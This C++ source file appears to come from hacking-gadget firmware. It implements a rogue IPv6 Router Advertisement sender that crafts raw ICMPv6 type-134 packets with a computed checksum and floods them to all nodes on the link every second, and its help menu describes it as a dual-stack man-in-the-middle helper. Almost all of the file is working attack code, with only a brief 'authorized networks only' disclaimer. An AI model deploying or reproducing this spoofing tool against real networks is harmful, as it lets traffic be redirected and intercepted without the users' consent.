#include "ipv6_ra.h"
#if defined(EVIL_EXTENSIONS)
#include "root/app/utils.h"
#include "root/net/wifi_common.h"
#include "root/ui/display.h"
#include <WiFi.h>
#include <globals.h>
#include <lwip/sockets.h>
#include <netinet/in.h>

// Lab-only: send ICMPv6 Router Advertisement (type 134) to ff02::1.

namespace {

int icmp6Checksum(const uint8_t *src, const uint8_t *dst, const uint8_t *icmp, size_t icmplen) {
    uint32_t sum = 0;
    // pseudo-header
    for (int i = 0; i < 16; i += 2) sum += (src[i] << 8) | src[i + 1];
    for (int i = 0; i < 16; i += 2) sum += (dst[i] << 8) | dst[i + 1];
    sum += icmplen;
    sum += 58; // next header ICMPv6
    for (size_t i = 0; i + 1 < icmplen; i += 2) sum += (icmp[i] << 8) | icmp[i + 1];
    if (icmplen & 1) sum += icmp[icmplen - 1] << 8;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return (uint16_t)~sum;
}

bool sendRouterAdvertisement() {
    int sock = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);
    if (sock < 0) return false;

    // Link-local source: fe80:: with EUI-64 from MAC (approx)
    uint8_t mac[6];
    WiFi.macAddress(mac);
    uint8_t src[16] = {0xfe, 0x80, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0xff, 0xfe, 0, 0, 0};
    src[8] = (uint8_t)(mac[0] ^ 0x02);
    src[9] = mac[1];
    src[10] = mac[2];
    src[13] = mac[3];
    src[14] = mac[4];
    src[15] = mac[5];
    uint8_t dst[16] = {0xff, 0x02, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0x01};

    // ICMPv6 RA: type 134, code 0, checksum, cur hop 64, flags M/O=0, router lifetime 1800,
    // reachable/retrans 0, option: source link-layer address
    uint8_t icmp[32];
    memset(icmp, 0, sizeof(icmp));
    icmp[0] = 134;
    icmp[1] = 0;
    icmp[4] = 64; // hop limit
    icmp[6] = 0x07;
    icmp[7] = 0x08; // lifetime 1800
    // option type 1 SLLAO
    icmp[16] = 1;
    icmp[17] = 1;
    memcpy(icmp + 18, mac, 6);
    uint16_t csum = icmp6Checksum(src, dst, icmp, 24);
    icmp[2] = (csum >> 8) & 0xff;
    icmp[3] = csum & 0xff;

    struct sockaddr_in6 sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin6_family = AF_INET6;
    memcpy(&sa.sin6_addr, dst, 16);

    // Bind to source
    struct sockaddr_in6 bindAddr;
    memset(&bindAddr, 0, sizeof(bindAddr));
    bindAddr.sin6_family = AF_INET6;
    memcpy(&bindAddr.sin6_addr, src, 16);
    bind(sock, (struct sockaddr *)&bindAddr, sizeof(bindAddr));

    int sent = sendto(sock, icmp, 24, 0, (struct sockaddr *)&sa, sizeof(sa));
    close(sock);
    return sent > 0;
}

} // namespace

void ipv6RaHelp() {
    showAppHelp(
        {
            "Lab dual-stack MITM helper.",
            "Authorized networks only.",
            "",
            "Send RA (ff02::1):",
            "  ICMPv6 Router Advertisement",
            "  once per second until ESC.",
            "  Clients may learn a rogue",
            "  default route / hop limit.",
            "",
            "Verify on a lab PC:",
            "  rdisc6 <iface>",
            "  ip -6 route",
            "",
            "Needs WiFi STA connected.",
            "Raw ICMPv6 may fail on some",
            "builds — check send count.",
            "",
            "Not a full DHCPv6 server.",
        }
    );
}

void ipv6RaMenu() {
    if (!WiFi.isConnected() && !wifiConnectMenu(WIFI_STA)) return;

    options = {
        {"Help", ipv6RaHelp},
        {"Send RA (ff02::1)",
         []() {
             int n = 0;
             int painted = -1;
             drawMainBorderWithTitle("IPv6 RA");
             padprintln("Sending... ESC stop");
             EscPress = false;
             while (!check(EscPress) && !returnToMenu) {
                 if (sendRouterAdvertisement()) n++;
                 if (n != painted) {
                     tft.fillRect(10, 40, tftWidth - 20, 16, kvxConfig.bgColor);
                     tft.drawString("RAs sent: " + String(n), 10, 40);
                     painted = n;
                 }
                 delay(1000);
             }
         }},
        {"Show STA IPv4",
         []() {
             displayInfo(WiFi.localIP().toString() + "\nVerify with:\nrdisc6 / ip -6 route", true);
         }},
    };
    addOptionToMainMenu();
    loopOptions(options, MENU_TYPE_SUBMENU, "IPv6 RA");
    options.clear();
}
#endif
